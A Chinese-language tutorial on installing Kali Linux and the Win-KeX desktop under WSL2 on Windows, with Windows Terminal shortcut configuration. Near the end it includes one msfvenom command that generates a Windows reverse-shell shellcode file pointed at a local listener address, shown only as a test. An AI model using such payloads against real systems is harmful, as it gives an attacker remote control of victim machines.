## **0x01 概要**

Windows操作系统支持Linux子系统(WSL)，是一种拥抱变化的改革，WSL从WSL1升级到了WSL2、Windows Terminal、Power
Shell、VSC等各种工具链的丰富增强，让Windows成为更适合程序员开发平台的同时，基于WSL2的Kali Linux、Kali Win-Kex也方便了安全从业人员，特别是于习惯了使用Kali
Linux作为渗透测试系统的人，WSL2的出现，让Kali系统与Windows系统共生，同时提供桌面服务，有Windows平台的便利性，又有Kali系统各种安全开发工具的功能加持。

这一篇，我们介绍如何在Windows的上安装Kali系统，将的老的WSL1升级到WSL2，安装Kali系统桌面版Win-Kex，基于Kali系统进行Web渗透测试、主机安全测试、安全项目的开发。

Kali于Windows上桌面工具叫Win-Kex,，Win-Kex系统本质是在基于命令行的Kai系统上安装一个Linux的Desktop桌面系统，然后通过VNC等服务，远程接入Kali
Linux的图形桌面系统，Win-Kex为用户提供三种运行形，用户可选择性使用。

##  **0x02 安装Windows Terminal**

在使用Kali Linux之前，建议大安装新版本的Windows
Terminal工具，多种配置方案、颜色、样式与之前Windows命令行窗口在使用体验上，有很大的提升。

![](https://image.3001.net/images/20210714/1626246100_60ee8bd485ece58d0ef3f.png!small)

（图-1）

早期Windows Terminal没有正式发布前，需要在Github中下载源代码，通过VSS进行编译生成， 现在直接在市场里下载即可，链接如下：

<https://www.microsoft.com/zh-cn/p/windows-terminal/9n0dx20hk701?activetab=pivot:overviewtab>

有了Windows Terminal，Win-Kex的三种启动方式，可以快速创建启动快捷方式，通过快捷方式，可以快速的进入Win-Kex三种运行模式中的一种，后面有介绍。

##  **0x03 升级WSL系统**

右键屏幕左下角开始图标，用管理员权限启动Windows Terminal。

![](https://image.3001.net/images/20210714/1626246130_60ee8bf209d2d73b1754f.png!small)

（图-2）

![](https://image.3001.net/images/20210714/1626246146_60ee8c022b7b7f19a5089.png!small)

（图-3）

弹出命令框后，输入如下指令。

    
    
    Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux

重起

再次打开用管理员权限执行命令行程序，输入如下命令。

    
    
    dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
    
    dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart

重起

下载WSL2安装或者升级到WSL2系统，因为测试环境是Windows 10是X64版本，下载对应的WSL2安装程序即可，链接如下：

<https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi>

![](https://image.3001.net/images/20210714/1626246165_60ee8c15c2a7641fb4444.png!small)

（图-4）

安装完WSL2的升级版本之后，我们在Windows Terminal将WSL的版本设置成版本2。

    
    
    wsl --set-default-version 2

![](https://image.3001.net/images/20210714/1626246181_60ee8c2531dede669b4ba.png!small)

（图-5）

##  **0x04 安装的Kali Linux**

在微软的商店中，有好几个发行版本的Linux系统，这系统当中就有Kali Linux。商店入口地址如下：

<https://aka.ms/wslstore>

![](https://image.3001.net/images/20210714/1626246195_60ee8c339737b6d49d6ca.png!small)

（图-6）

默认的Kali系统只是一个命令版本的Kali
Linux系统，没有桌面功能，也没有全部的Kali安全工具，如果需要，需要安全Large版的Kali系统。Kali安装之后的命令执行效果，如下：

![](https://image.3001.net/images/20210714/1626246218_60ee8c4a7a6ddf68a7442.png!small)

（图-7）

可以通过WSL –list命令看到系统中装了多少个子系统。

![](https://image.3001.net/images/20210714/1626246230_60ee8c5670044ebf587ac.png!small)

（图-8）

执行如下命令：

    
    
    wsl -d kali-linux

![](https://image.3001.net/images/20210714/1626246240_60ee8c60854491ae20318.png!small)

（图-9）

##  **0x05 安装Win-Kex**

Kali系统是基于Ubuntu发行版本的Linux上装了很多非常经典的渗透测试工具。Win-Kex是一个Linux桌面系统，安装成功之后，我们可以在Windows上使用Linux的桌面系统。

还有打找Windows Terminal执行下面的命令：

sudo apt update

更新各种安装依赖

sudo apt install -y kali-win-kex

安装kali-win-kex，如果本地安装环境的网格足够好，可以顺利的安装完成Win-Kex。

安装了的Win-Kex相当于可以在Windows系统上使用的Linux的桌面系统功能。Win-Kex有三种运行模式，非常的方便。

第一种模式：Windows模式

![](https://image.3001.net/images/20210714/1626246253_60ee8c6d130dea6f32b56.png!small)

（图-10）

在Windows Terminal里执行如下命令：

kex --win -s

这种模式是独享屏幕的，这种模式的启动后的Linux Desktop桌面会覆盖原有Windows的桌面系统。

增加会话模式

在Windows Terminal里执行如下命令：

kex --esm --ip -s

这种模式的特点是，Linux的桌面系统在Windows系统里也是一个子窗体应用，可以最大化，也可以最小化， 不会覆盖Windows的桌面。

![](https://image.3001.net/images/20210714/1626246269_60ee8c7d1bb9fa619d65f.png!small)

（图-11）

无缝模式

![](https://image.3001.net/images/20210714/1626246282_60ee8c8aeb5c40fc660fc.png!small)

（图-12）

在Windows Terminal里执行如下命令：

> kex --sl -s

无缝模式简单说，就是Linux
Desktop桌面的GUI与Windows的桌面GUI都混合在一起了。用起来很方便，有时候也显得有点乱。这三种模式依赖于TigerVNC服务的支持。
进入Linu系统内部看一下服务就可以发现其中的工作机制。

如果你想使用更多的Kali工具，需要安装完全版本的Kali系统。

在安装的时候需要，执行下面的命令。

sudo apt install -y kali-linux-large

![](https://image.3001.net/images/20210714/1626246298_60ee8c9a7ac99d110c0bd.png!small)

（图-13）

##  **0x06 配置Kali三种启动方式的快捷方式**

![](https://image.3001.net/images/20210714/1626246312_60ee8ca86e236f666de85.png!small)

（图-14）

在 Windows Terminal下面有一个要快速执行命令的方式下拉列表，这个可以通过配置一个JSON文件来增减项目。

![](https://image.3001.net/images/20210714/1626246325_60ee8cb56b80f91b7756a.png!small)

（图-15）

通过在JSON文件中加入新的JSON字段完成快捷方式的建立。

![](https://image.3001.net/images/20210714/1626246338_60ee8cc224669cd34fea6.png!small)

（图-16）

用Visual Studio打工这个文件，然后加入如下的配置。

    
    
    {
    
    "guid": "{55ca431a-3a87-5fb3-83cd-11ececc031d3}",
    
    "hidden": false,
    
    "name": "Win-KeX-Common",
    
    "commandline": "wsl -d kali-linux kex --wtstart -s"
    
    },
    
    {
    
    "guid": "{55ca431a-3a87-5fb3-83cd-11ececc031d2}",
    
    "hidden": false,
    
    "name": "Win-KeX-SL",
    
    "commandline": "wsl -d kali-linux kex --sl --wtstart -s"
    
    },
    
    {
    
    "guid": "{55ca431a-3a87-5fb3-83cd-11ecedc031d2}",
    
    "hidden": false,
    
    "name": "Win-KeX-ESM",
    
    "commandline": "wsl -d kali-linux kex --esm --wtstart -s"
    
    }

通过以上操作，可以快速启动Kex的任意一种模式，不用再敲击命令了。

##  **0x07 测试Metaspolit配套相关**

到此我们已经在Windows系统上，通过WSL2安装了Kali
Linux的命令与桌面系统。我测试使用一下Metaspolit来生成一个小文件。然后不需通过虚拟机过去共享文件人方式，就可以快速的得到这个文件。

以增加模式运行Kex，Linux的桌面与Windows的桌面是共享剪贴板的，并且可以直接进入Windows的文件系统。这些在这前虚拟机系统上使用起来需要配置，现在在WSL天然支持。

启动Kali系统，打一个Terminal，执行下面的命令：

    
    
    cd /mnt/g/kali
    
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.6 LPORT=8001 -b '''\x00\x0a\x40' -f python > scode.py

![](https://image.3001.net/images/20210714/1626246353_60ee8cd1d32da96a62334.jpg!small)

（图-17）

在Kex里生成文件，在Windows系统里用VSC打开这个文件。

![](https://image.3001.net/images/20210714/1626246373_60ee8ce52b96252f337fa.png!small)

（图-18）

##  **0x08 总结**

很多朋友喜欢在VMWare、Virtual Box虚拟机软件中，使用Kali Linux系统，通过实践证明，基于用WSL2安装Kali
Linux也很方便。这种安装方式可以让Kali桌面与Windows桌面功能融合，站在Windows系统与Linux系统的交汇处，让用户同时方便的使用Linux与Windows桌面系统与应用，Windows工具的便利，Kali安全测试工具的全面，
提高生产与测试的效率。

